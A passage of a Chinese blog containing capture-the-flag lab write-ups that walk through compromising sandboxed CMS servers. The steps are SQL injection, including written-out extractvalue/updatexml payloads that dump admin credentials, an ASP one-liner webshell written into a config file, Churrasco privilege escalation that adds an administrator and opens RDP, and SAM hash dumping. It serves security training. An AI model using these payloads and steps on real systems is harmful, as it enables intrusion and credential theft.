<p>打开 HackBar 工具，我们对 <code>admin</code>、<code>user</code>、<code>news</code> 等常见表名进行猜解，发现均能正常显示：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/manual-tables.png" alt="manual-tables"></p>
<h3 id="Step-2：猜解列数"><a href="#Step-2：猜解列数" class="headerlink" title="Step 2：猜解列数"></a>Step 2：猜解列数</h3><p>已知 <code>admin</code> 表存在后，接着猜解当前未知表的列数，用于后续的<a href="http://www.w3school.com.cn/sql/sql_union.asp">联合查询（UNION SELECT）</a>，因为<strong>联合查询的必要条件是每个查询的列数需要严格相等</strong>。</p>
<p>猜解列数最便捷的方法是利用 <a href="http://www.w3school.com.cn/sql/sql_orderby.asp"><strong>ORDER BY</strong></a> 语句的隐藏用法。一般来说，<code>ORDER BY &lt;column&gt;</code> 代表对 <code>&lt;column&gt;</code> 列进行升排序，而 <strong><code>ORDER BY &lt;column_order&gt;</code> 代表对第 <code>&lt;column_order&gt;</code> 列进行升排序</strong>。容易看出，<code>&lt;column_order&gt;</code> 的最大取值即为查询数据的列数，因此，当发现 <code>ORDER BY n</code> 显示正常，并且 <code>ORDER BY n+1</code> 出现异常时，可判断当前查询数据的列数为 n。</p>
<p><strong>注意，只有在后端数据库的查询语句为 <code>SELECT * FROM admin</code> 时，当前查询数据的列数 n 才等于数据库 <code>admin</code> 的总列数。</strong>详情可参考：<a href="https://segmentfault.com/a/1190000002655427">sql注入之order by猜列数问题</a>。</p>
<p>经过反复尝试，可以确定查询数据的列数为 11：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/manual-num-true.png" alt="manual-num-true"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/manual-num-false.png" alt="manual-num-false"></p>
<h3 id="Step-3：找出显位点"><a href="#Step-3：找出显位点" class="headerlink" title="Step 3：找出显位点"></a>Step 3：找出显位点</h3><p>下面要构造联合查询 <code>UNION SELECT 1,2,...,n FROM &lt;table&gt;</code> 找出显位点，其中列数为 n，表名为 <code>&lt;table&gt;</code>。</p>
<blockquote>
<p>小贴士：查询结果中的某些数据会出现在当前页面，而这些数据对应的列称为<strong>显位点</strong>。</p>
</blockquote>
<p>经过反复试验，得知该数据库是从查询结果的第 1 列数据开始升排序（若第 1 列相等，则比较第 2 列，以此类推），并且将第 1 行结果的部分数据在页面上展示。因此上述联合查询能有效执行，并发现了显位点为第 2、3、7、8、9 列：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/manual-points.png" alt="manual-points"></p>
<p>若想完全避免前一次查询结果的影响，可将限制条件 <code>id=1</code> 改为 <code>id=1 AND 1=2</code>。</p>
<h3 id="Step-4：猜解列名"><a href="#Step-4：猜解列名" class="headerlink" title="Step 4：猜解列名"></a>Step 4：猜解列名</h3><p>最后一步，就是用猜想的列名去替换显位点，如果猜想正确，则页面会显示数据内容，否则出现异常。我们对 <code>user</code>、<code>username</code>、<code>account</code>、<code>pwd</code>、<code>password</code>、<code>key</code>、<code>credit</code> 等常见列名进行猜解，终于在 <code>username</code>、<code>password</code> 两列中读取到管理员的账号密码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/manual-result.png" alt="manual-result"></p>
<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>在本节末尾留个小彩蛋，细心的读者可能在上述注入点的页面底部发现了：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/leak.png" alt="leak"></p>
<p>对的，你想的没错，管理员的 16 位密码哈希值，用 <a href="http://www.dmd5.com/">MD5解密工具</a> 解密后的明文结果正是 <code>admin888</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/password.png" alt="password"></p>
<h1 id="0x03-获取后台登录地址"><a href="#0x03-获取后台登录地址" class="headerlink" title="0x03 获取后台登录地址"></a>0x03 获取后台登录地址</h1><p>根据实验手册的提示，在实验工具箱的【目录扫描】-&gt;【御剑后台扫描工具】文件夹下打开工具，在 <strong>域名</strong> 处填上主站 URL <code>http://www.test.ichunqiu/</code>，点击 <strong>开始扫描</strong> 即可轻松获取后台登录地址 <code>/admin/login.asp</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/yujian-scan.png" alt="yujian-scan"></p>
<p>上节提到的明小子（Domain）注入工具也带有目录扫描功能，点击 <strong>SQL注入 -&gt; 管理入口扫描</strong> 选项卡，在 <strong>注入点</strong> 处填上主站 URL，点击 <strong>扫描后台地址</strong> 同样能得到后台登录地址：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/domain-scan.png" alt="domain-scan"></p>
<blockquote>
<p>小贴士：通过这几次渗透实验可发现，大多 CMS 的默认后台登录地址为 <code>/admin</code>，因此在使用目录扫描工具前可先行尝试。</p>
</blockquote>
<h1 id="0x04-配置文件写入木马获取-webshell"><a href="#0x04-配置文件写入木马获取-webshell" class="headerlink" title="0x04 配置文件写入木马获取 webshell"></a>0x04 配置文件写入木马获取 webshell</h1><p>第 2 题过后，随之而来的第 3 题又是一道选择题：「通过什么方式获得 webshell？」，这也同时是对接下来渗透的提示。</p>
<p>先用管理员账号 <code>admin</code> 与密码 <code>admin888</code> 登录后台：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/login-back.png" alt="login-back"></p>
<p>根据题目的提示，寻找后台备份文件、文件上传处、内容填写框等能够插入木马的漏洞，但可惜的是，很快能发现<strong>备份文件无效、文件上传无反应、大多文本框不能填写</strong>，看来服务器限制了该账户的写入权限。</p>
<p>只剩下<strong>写入配置文件</strong>了，并在 <strong>系统设置管理 -&gt; 网站信息配置</strong> 发现了配置文件更改处。问题又来了，写入木马的配置文件在哪读取？于是先在外网搜索到 CMS 的源码，在此目录中搜索 <code>conf</code> 等关键字，发现了 4 个目标文件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/search-config.png" alt="search-config"></p>
<p>经过逐一排查，最终确定其中的 <code>/inc/Config.asp</code> 与网站配置信息相关：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/inc-config.png" alt="inc-config"></p>
<p>接下来尝试在任意一栏中写入 ASP 版的一句话木马 <code>&quot;%&gt;&lt;%Eval Request(&quot;cmd&quot;)%&gt;&lt;%&#39;</code>。<strong>注意：<code>&quot;%&gt;</code> 是为了闭合前段 ASP 代码；<code>cmd</code> 是木马的请求参数；<code>&lt;%&#39;</code> 是为了开启后段 ASP 代码，并用单引号注释该行剩下的代码。</strong>写入木马前，最好把栏中原有的配置信息删除，即可直观地判断是否写入成功。</p>
<p>以 <strong>网站标题</strong> 一栏为例，写入一句话木马：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/trojan-writing.png" alt="trojan-writing"></p>
<p>写入后点击 <strong>保存设置</strong>，可见写入木马后该栏为空：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/trojan-written.png" alt="trojan-written"></p>
<p>然后在工具箱【webshell】目录下拔出<a href="http://www.zhongguocaidao.com/">中国菜刀</a>，在 <strong>添加SHELL</strong> 中填入目标 URL 与请求参数后保存：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/chopper-trojan.png" alt="chopper-trojan"></p>
<p>双击 shell 记录，成功连接网站的文件管理系统：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/chopper-file-manager.png" alt="chopper-file-manager"></p>
<p>最后回到题目，根据选项提示，成功验证了能够通过 <strong>写入配置文件</strong> 获得 webshell：</p>
<ul>
<li><input disabled="" type="checkbox"> 后台备份文件 </li>
<li><input disabled="" type="checkbox"> 直接上传木马</li>
<li><input disabled="" type="checkbox"> 代码执行</li>
<li><input checked="" disabled="" type="checkbox"> 写配置文件</li>
</ul>
<h1 id="0x05-上传工具，系统提权"><a href="#0x05-上传工具，系统提权" class="headerlink" title="0x05 上传工具，系统提权"></a>0x05 上传工具，系统提权</h1><p>终于到达最后一关：「获取目标服务器密码」，这需要破解操作系统上用户的密码哈希值，倒推一下思路：<strong>获得服务器系统最高权限 -&gt; 上传提权工具 -&gt; 寻找上传点</strong>，赶紧动手开始吧！</p>
<p>怎么确定上传点呢？具有写权限的目录都可以作为上传点，在 C 盘下的每个目录尝试上传，发现 <code>C:\Inetpub</code>、<code>C:\RECYCLER</code>、<code>C:\wmpub</code> 三个目录具有写权限，其他目录均写入失败。下面演示以 <code>C:\wmpub</code> 作为上传点。</p>
<p>系统提权将利用 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0079"><strong>CVE-2009-0079</strong></a> 漏洞，采取 <strong>cmd.exe + Churrasco.exe + 3389.bat</strong> 的工具组合，其中 cmd.exe 是为了代替原服务器中权限受限的命令行交互环境，Churrasco.exe 是用于提权的漏洞利用工具，3389.bat 是打开 3389 端口及远程桌面服务的批处理脚本文件。</p>
<blockquote>
<p>小贴士：CVE-2009-0079 是 Microsoft Windows RPCSS 服务隔离的本地权限提升漏洞，收录于 Microsoft 安全公告 <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-012">MS09-012</a>，影响 <strong>Microsoft Windows Server 2003 SP2</strong> 等多个系统版本。</p>
</blockquote>
<h2 id="Churrasco-exe-提权"><a href="#Churrasco-exe-提权" class="headerlink" title="Churrasco.exe 提权"></a>Churrasco.exe 提权</h2><p><strong>Churrasco.exe</strong>，又称「巴西烤肉」，是 CVE-2009-0079 漏洞的常见利用工具，能够以 SYSTEM 权限执行命令，从而可以达到添加用户的目的。</p>
<p>首先将工具箱【提权工具】-&gt;【windows】目录中的三款工具，在菜刀的文件管理页面空白处，右键点击 <strong>上传文件</strong> 至服务器 <code>C:\wmpub</code> 目录下，接着右击 cmd.exe，选择 <strong>虚拟终端</strong> 进入到命令行交互界面：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/chopper-upload.png" alt="chopper-upload"></p>
<p>输入 <code>systeminfo</code> 命令，获取服务器系统相关信息，得知系统为 Microsoft Windows Server 2003 Enterprise Edition SP2，且只安装了一个补丁程序，即可猜测该系统存在 CVE-2009-0079 漏洞：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/systeminfo.png" alt="systeminfo"></p>
<p>接着切换到 <code>C:\wmpub</code> 目录，输入 <code>churrasco &quot;net user ichunqiu key /add&quot;</code> 命令，添加一个名为 <code>ichunqiu</code>、密码为 <code>key</code> 的用户：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/churrasco-user.png" alt="churrasco-user"></p>
<p>再输入 <code>churrasco &quot;net localgroup administrators ichunqiu /add&quot;</code>命令，将 <code>ichunqiu</code> 用户添加到 <code>administrators</code> 用户组：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/churrasco-localgroup.png" alt="churrasco-localgroup"></p>
<blockquote>
<p>小贴士：可通过 <code>net user</code> 与 <code>net localgroup administrators</code> 查看命令是否执行成功。</p>
</blockquote>
<p>最后输入 <code>churrasco 3389</code> 命令，打开 3389 端口及远程桌面服务：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/churrasco-3389.png" alt="churrasco-3389"></p>
<p>确认提权成功后，在本机上点击 <strong>开始 -&gt; 运行</strong>，输入 <a href="https://baike.baidu.com/item/mstsc"><code>mstsc</code></a>，远程计算机地址为 <code>172.16.12.2</code>（在实验场景拓扑图上可见）：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/mstsc.png" alt="mstsc"></p>
<p>正常的话会弹出远程桌面，输入用户名 <code>ichunqiu</code> 与密码 <code>key</code>，即可成功登录远程服务器：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/login-server.png" alt="login-server"></p>
<h2 id="pr-exe-提权"><a href="#pr-exe-提权" class="headerlink" title="pr.exe 提权"></a>pr.exe 提权</h2><p><strong>pr.exe</strong> 也是 CVE-2009-0079 漏洞的提权工具，位于【提权工具】-&gt;【windows】目录下，使用方法与 Churrasco.exe 类似。不过注意的是，在第一次执行创建用户命令时，可能会报错，若创建失败，只需再次执行即可：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/pr.png" alt="pr"></p>
<h2 id="iis-exe-提权"><a href="#iis-exe-提权" class="headerlink" title="iis.exe 提权"></a>iis.exe 提权</h2><p><strong>iis.exe</strong> 与前两者不同，是基于 <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1535"><strong>CVE-2009-1535</strong></a> 漏洞的提权工具，位于【提权工具】-&gt;【windows】目录下（最好选用 iis6.0-local.exe，因为 iis6.exe 在打开 3389 端口时会出错），使用方法与前两者类似。在第一次创建用户时也可能会报错，若创建失败，再次执行即可：</p>
<blockquote>
<p>小贴士：CVE-2009-1535 是 IIS 5.1 和 6.0 中 <a href="https://baike.baidu.com/item/WebDAV">WebDAV</a> 扩展的身份验证绕过漏洞，收录于 Microsoft 安全公告 <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-020">MS09-020</a>，影响 <strong>Microsoft Windows Server 2003 SP2 中 Internet Information Services 6.0</strong> 等多个系统版本。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/iis.png" alt="iis"></p>
<h1 id="0x06-获取管理员系统密码"><a href="#0x06-获取管理员系统密码" class="headerlink" title="0x06 获取管理员系统密码"></a>0x06 获取管理员系统密码</h1><p>进入到远程主机桌面，此时可以通过 <a href="http://www.openwall.com/passwords/windows-pwdump">pwdump 工具</a> 获取管理员密码的哈希值，常见的 pwdump 工具有 Pwdump7、QuarksPwDump、Cain &amp; Abel 等，最后将哈希值通过在线解密即可获得密码明文。</p>
<blockquote>
<p>小贴士：<a href="https://en.wikipedia.org/wiki/Pwdump"><strong>pwdump</strong></a> 是一类能从 Windows <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">SAM（Security Account Manager）</a> 中读出本地用户 <a href="https://en.wikipedia.org/wiki/LAN_Manager#LM_hash_details">LM（LAN Manager）</a> 与 <a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NTLM（NT LAN Manager）</a> 密码哈希值的工具（注意必须在管理员权限下），其中 LM 与 NTLM 是 Windows 系统下的安全认证协议，并且 NTLM 是 LM 的演进版本，安全性更高。</p>
</blockquote>
<h2 id="Pwdump7"><a href="#Pwdump7" class="headerlink" title="Pwdump7"></a>Pwdump7</h2><p><a href="http://www.tarasco.org/security/pwdump_7/index.html"><strong>Pwdump7</strong></a> 是 <a href="http://www.tarasco.org/security/index.html">Tarasco Security</a> 发布的一款免费软件，能够从 SAM 中快速提取用户密码哈希值，易用性与有效性极佳。</p>
<p>使用之前，将实验工具箱【提权工具】-&gt;【hash】-&gt;【Pwdump7】文件夹下的 <strong>Pwdump7.exe</strong> 与 <strong>libeay32.dll</strong> 两个文件通过菜刀上传至服务器 <code>C:\wmpub</code> 目录，再回到远程主机桌面点击【开始】 -&gt; 【我的电脑】，进入上传点打开 cmd.exe，直接输入 <code>pwdump7</code> 命令即可获得所有用户的密码哈希值，其中 <code>62C4700EBB05958F3832C92FC614B7D1</code> 是 LM 哈希，<code>4D478675344541AACCF6CF33E1DD9D85</code> 是 NTLM 哈希：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/pwdump7.png" alt="pwdump7"></p>
<h2 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a>QuarksPwDump</h2><p><a href="https://blog.quarkslab.com/quarks-pwdump.html"><strong>QuarksPwDump</strong></a> 是 <a href="https://quarkslab.com/">Quarkslab</a> 发布的一款开源工具，能导出 Windows 下各种类型的用户凭证，它自身有专属的命令交互界面，可输入不同的命令选项获得所需数据。</p>
<p>使用前，同样先将【提权工具】-&gt;【hash】-&gt;【QuarksPwDump_v0.1】文件夹下的 <strong>QuarksPwDump.exe</strong> 上传至服务器 <code>C:\wmpub</code> 目录，在远程主机上传点打开 cmd.exe，直接输入 <code>quarkspwdump</code> 命令：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/quarkspwdump-cmd.png" alt="quarkspwdump-cmd"></p>
<p>命令成功执行后，进入到 QuarksPwDump.exe 命令交互界面，再输入 <code>quarkspwdump --dump-hash-local</code> 命令：</p>
<blockquote>
<p>小贴士：对命令选项熟悉后，可直接在 cmd 命令交互界面中输入 <code>quarkspwdump --dump-hash-local</code> 命令。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/quarkspwdump-input.png" alt="quarkspwdump-input"></p>
<p>界面刷新，并导出本地用户的密码哈希值：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/quarkspwdump-result.png" alt="quarkspwdump-result"></p>
<h2 id="Cain-amp-Abel"><a href="#Cain-amp-Abel" class="headerlink" title="Cain &amp; Abel"></a>Cain &amp; Abel</h2><p><a href="http://www.oxid.it/cain.html"><strong>Cain &amp; Abel</strong></a> 是 <a href="http://www.oxid.it/">oxid.it</a> 发布的一款综合网络渗透工具，在密码恢复、暴力破解、网络嗅探、路由协议分析等场景有广泛应用。</p>
<p>使用前，先把【arp嗅探】-&gt;【Cain】文件夹下的 <strong>ca_setup_53494.exe</strong> 安装包上传至服务器 <code>C:\wmpub</code> 目录进行安装，并且安装完 Cain &amp; Abel 后，必须同时安装后续的 WinPcap，否则功能缺失出现报错：</p>
<blockquote>
<p>小贴士：比起前两款工具，Cain &amp; Abel 使用前需要安装，并且操作步骤相对繁琐，增大了在目标系统留下痕迹的可能，因此建议在满足需求的情况下，尽量选用小巧便捷的工具。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/cain-install.png" alt="cain-install"></p>
<p>全部安装完毕后点击桌面上的 <strong>Cain</strong>，在 <strong>Cracker</strong> 选项卡下选中 <strong>LM &amp; NTLM Hashes</strong>，点击 <strong>Add to list（即蓝色加号）</strong>，勾选上 <strong>Include Password History Hashes</strong> ：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/cain-config.png" alt="cain-config"></p>
<p>点击 <strong>Next</strong> 后即能获取到所有本地用户的密码哈希值：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/cain-result.png" alt="cain-result"></p>
<h2 id="Online-Hash-Crack"><a href="#Online-Hash-Crack" class="headerlink" title="Online Hash Crack"></a>Online Hash Crack</h2><p>在线破解哈希值推荐一个瑞士网站 <a href="http://www.objectif-securite.ch/">Objectif Sécurité </a>，无需注册付费，便捷实用。</p>
<p>在主页点击 <strong>OPHCRACK</strong> 选项卡，将 NTLM 哈希 <code>4D478675344541AACCF6CF33E1DD9D85</code> 填入第一个文本框，点击 <strong>GO</strong> 解密后，即得管理员系统密码的明文 <code>cu9e2cgw</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/objectif.png" alt="objectif"></p>
<h1 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h1><p>本篇 writeup 借此深入彻底的渗透模拟实验，总结了渗透过程中信息收集、SQL 注入、插入木马、获取 webshell、权限提升、获取系统用户密码等用到的数十种工具与分析方法，希望有助于各位读者对渗透测试全过程的理解，在动手实践之后能更熟练地掌握工具。</p>
<p>笔者水平有限，在边学习实践边分析思考的情况下总结出以上心得，不足之处望各位指出，有独特思路的欢迎交流。最后向以下三篇参考 writeup 的作者致以真诚的感谢，前辈们的努力促使了国内安全技术的蓬勃发展！</p>
<blockquote>
<p><a href="https://bbs.ichunqiu.com/thread-1783-1-1.html">01-在线挑战详细攻略-《我很简单，请不要欺负我》</a><br><a href="https://www.cnblogs.com/renzongxian/p/4945083.html">ichunqiu在线挑战–我很简单，请不要欺负我 writeup</a><br><a href="https://bbs.ichunqiu.com/thread-1833-1-1.html">《我很简单，请不要欺负我》实验攻略</a></p>
</blockquote>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>Crypto</tag>
        <tag>i春秋</tag>
        <tag>Pentest</tag>
        <tag>Exploit</tag>
        <tag>CMS</tag>
        <tag>SQLi</tag>
        <tag>Trojan</tag>
        <tag>Vulnerability</tag>
        <tag>ASP</tag>
        <tag>Database</tag>
        <tag>Privilege</tag>
        <tag>CMD</tag>
      </tags>
  </entry>
  <entry>
    <title>【i春秋】渗透测试入门 —— 渗透测试笔记</title>
    <url>/2018/03/14/ichunqiu-pentest-introduction-pentest-note/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本题算是一道较为综合的渗透题，要求对两个服务器系统进行渗透，第一个是<strong>基于<a href="http://www.qibosoft.com/index.htm">齐博 CMS</a> 的信息资讯平台</strong> <code>http://www.test.ichunqiu</code>，第二个是<strong>基于 <a href="http://www.discuz.net/forum.php">Discuz!</a> 的论坛社区</strong> <code>http://bbs.test.ichunqiu</code>。这两个 CMS 同样能在网上找到许多漏洞，常用作渗透测试的练习靶机。</p>
<p>根据提示，第 1 题要求找到咨询平台的管理员账号密码；第 2 题需要登录服务器后台，并插入木马，再用<a href="http://www.zhongguocaidao.com/">中国菜刀</a>连接，继而找到在管理员桌面上的 flag 文件；第 3 题要求在论坛社区的数据库中找到 admin 账户的 <code>salt</code> 值。</p>
<ul>
<li>题目链接：<a href="https://www.ichunqiu.com/battalion?t=2&r=54399">https://www.ichunqiu.com/battalion?t=2&r=54399</a></li>
<li>解题链接：<a href="https://www.ichunqiu.com/vm/50629/1">https://www.ichunqiu.com/vm/50629/1</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/guide.png" alt="guide"></p>
<h1 id="0x01-获取-www-test-ichunqiu-后台登录密码"><a href="#0x01-获取-www-test-ichunqiu-后台登录密码" class="headerlink" title="0x01 获取 www.test.ichunqiu 后台登录密码"></a>0x01 获取 <a href="http://www.test.ichunqiu/">www.test.ichunqiu</a> 后台登录密码</h1><p>利用 SQL 报错注入是获取管理员账号密码的常见方法。在浏览器搜索齐博 CMS 的可利用漏洞，其中发现了一个 SQL 报错注入漏洞，在 <code>/member/special.php</code> 中的 <code>$TB_pre</code> 变量未初始化，未作过滤，且直接与代码进行拼接，注入发生后可在报错信息中看到管理员的账号密码。详情可参考：</p>
<blockquote>
<p><a href="http://0day5.com/archives/3198/">齐博CMS整站系统SQL注入</a></p>
</blockquote>
<p>下面打开 Firefox 浏览器，根据漏洞说明先任意注册一个账号：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/register-info.png" alt="register-info"></p>
<p>登录后点击 <strong>会员中心 -&gt; 专题管理 -&gt; 创建专题</strong>，任意创建一个专题：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/subject-creation.png" alt="subject-creation"></p>
<p>点击专题名称，在弹出的专题页面中查看其 URL，并记录下 <code>id</code> 值（此处 <code>id=27</code>）：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/subject-id.png" alt="subject-id"></p>
<p>接下来访问 <code>http://www.test.ichunqiu/member/special.php</code>，并打开 HackBar 工具，按照漏洞报告中的格式填写好 URL 和请求数据。URL 的查询字符串填入 <code>job=show_BBSiframe&amp;id=27&amp;type=all</code>（注意 <code>id</code> 值要等于上述专题 ID），请求数据填入 SQL 报错注入的 payload：</p>
<blockquote>
<p>小贴士：为了方便使用 HackBar，可在浏览器右上角点击 <strong>菜单 -&gt; 定制</strong>，将 HackBar 拖到工具栏中。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/sqli-1.png" alt="sqli-1"></p>
<p>从报错信息中得知管理员账号为 <code>admin</code>，密码的哈希值只有 26 位，因此修改一下 payload 的输出值，再次注入，便可看到完整的密码哈希值为 <code>b10a9a82cf828627be682033e6c5878c</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/sqli-2.png" alt="sqli-2"></p>
<p>以上 payload 在漏洞报告的基础上稍作修改，否则输出不了完整的密码哈希。</p>
<p>关于 SQL 报错注入的可利用函数较多，本题选用了 <a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue"><code>extractvalue()</code></a> 函数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TB_pre<span class="operator">=</span>qb_members <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>,(<span class="keyword">select</span> concat(<span class="number">0x7e</span>,username,password) <span class="keyword">from</span> qb_members limit <span class="number">1</span>)))<span class="comment">-- a</span></span><br></pre></td></tr></table></figure>

<p>也可以选用 <a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml"><code>updatexml()</code></a> 函数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TB_pre<span class="operator">=</span>qb_members <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>,(<span class="keyword">select</span> concat(<span class="number">0x7e</span>,username,password) <span class="keyword">from</span> qb_members limit <span class="number">1</span>)),<span class="number">0</span>)<span class="comment">-- a</span></span><br></pre></td></tr></table></figure>

<p>以下是在<a href="http://payloads.online/">倾旋</a>的公开课中总结出来的 <a href="https://www.mysql.com/">MySQL</a> 数据库常用十大报错函数，建议去官方文档查阅每个函数的用法，多看多练，熟能生巧：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/error-function-1.png" alt="error-function-1"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/error-function-2.png" alt="error-function-2"></p>
<p>最后利用 <a href="http://www.dmd5.com/md5-decrypter.jsp">MD5解密工具</a> 对密码哈希值解密，得到密码明文为 <code>whoami!@#123</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-pentest-note/password.png" alt="password"></p>
<h1 id="0x02-获取目标服务器-1-管理员桌面的-FLAG-文件信息"><a href="#0x02-获取目标服务器-1-管理员桌面的-FLAG-文件信息" class="headerlink" title="0x02 获取目标服务器 1 管理员桌面的 FLAG 文件信息"></a>0x02 获取目标服务器 1 管理员桌面的 FLAG 文件信息</h1><p>获取了管理员权限，相当于完成了 getshell 的一半。随便搜搜可发现许多用于齐博 CMS getshell 的漏洞，下面选取两个文件写入漏洞进行复现。</p>
<h2 id="后台频道页版权信息写入木马"><a href="#后台频道页版权信息写入木马" class="headerlink" title="后台频道页版权信息写入木马"></a>后台频道页版权信息写入木马</h2><p>第一个漏洞涉及两个操作：一是在网页底部版权信息中写入一句话木马，二是创建频道静态化页面。漏洞报告中未给出审计过程，本人对此组合拳甚是佩服，详情可参考：</p>
<blockquote>
<p><a href="http://0day5.com/archives/1046/">齐博cms最新后台getshell</a></p>
</blockquote>
<p>先搜索到齐博 CMS 的默认登录后台为 <code>/admin/index.php</code>，遂尝试访问，发现后台路径确实没修改。再用账号 <code>admin</code> 与密码 <code>whoami!@#123</code> 登录后台：</p>
